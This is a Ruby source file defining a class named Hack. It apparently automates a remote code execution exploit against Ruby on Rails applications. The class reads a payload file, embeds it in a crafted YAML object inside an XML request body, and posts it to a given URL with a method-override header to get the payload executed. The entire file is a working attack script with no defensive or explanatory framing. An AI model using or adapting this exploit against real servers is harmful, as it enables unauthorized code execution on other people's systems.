require 'ronin/formatting/html'
require 'net/http'
require 'uri'
class Hack

  include Ronin::UI::Output::Helpers
  include Ronin::Network::HTTP
  attr_accessor :url, :payload

  def initialize(url)
    self.url = url
    self.payload = File.read("#{Rails.root}/app/models/payload.rb")
  end

  def url_valid?
    url.present? && url =~ URI::regexp
  end

  def drop_mah_payload!
    Timeout::timeout(5) {
      exploit.code.to_s == "200"
    }
  rescue Timeout::Error, StandardError
    false
  end


  def escape_payload(payload)
    "foo\n#{payload}\n__END__\n"
  end

  def wrap_payload(payload)
    "(#{payload}; @executed = true) unless @executed"
  end

  def exploit
    escaped_payload = escape_payload(wrap_payload(payload))
    encoded_payload = escaped_payload.to_yaml.sub('--- ','').chomp

yaml = %{
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? #{encoded_payload}
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format
}.strip

xml = %{
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">#{yaml.html_escape}</exploit>
}.strip

    return http_post(
      url: url,
      headers: {
        content_type: 'text/xml',
        x_http_method_override: 'get'
      },
      body: xml
    )

  end

end


